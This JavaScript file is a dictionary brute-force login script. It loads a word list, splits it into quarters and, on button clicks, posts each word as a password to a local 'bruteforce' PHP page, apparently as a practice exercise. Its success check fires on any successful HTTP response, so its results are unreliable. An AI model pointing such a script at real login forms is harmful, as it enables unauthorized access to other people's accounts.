var passwords = [];
var password = '';
var numberOfAttackFailed = 0;
var quarter, firstQuarter, secondQuarter, thirdQuarter, fourthQuarter;

  $.ajax({
    type: 'GET',
    dataType: 'text',
    async: false,
    url: './dico.txt',
    success: function (data){
      passwords = data.split(/\n/);
    },
  });
quarter = Math.floor(passwords.length / 4);
firstQuarter = passwords.splice(0, quarter);
secondQuarter = passwords.splice(0, quarter);
thirdQuarter = passwords.splice(0, quarter);
fourthQuarter = passwords.splice(0, quarter);

function ajaxAttack(array){
  for ( var i = 0; i < array.length; i++){
    password = array[i];
    var data = {password: password};
    console.log('attacking!');
    $.ajax({
      type: 'POST',
      async: false,
      url: 'localhost/bruteforce/index.php',
      data: data,
      success: function(){
        console.log('Ca marche! le bon password est : '+ password +' !');
      },
      error: function(){
        // console.log('Ca ne marche pas. '+ password +' est un mauvais mot de passe!');
        numberOfAttackFailed++;
      }
    });
  }
}

$('#first-quarter').on('click', function(){
  ajaxAttack(firstQuarter);
});

$('#second-quarter').on('click', function(){
  ajaxAttack(secondQuarter);
});

$('#third-quarter').on('click', function(){
  ajaxAttack(thirdQuarter);
});

$('#fourth-quarter').on('click', function(){
  ajaxAttack(fourthQuarter);
});
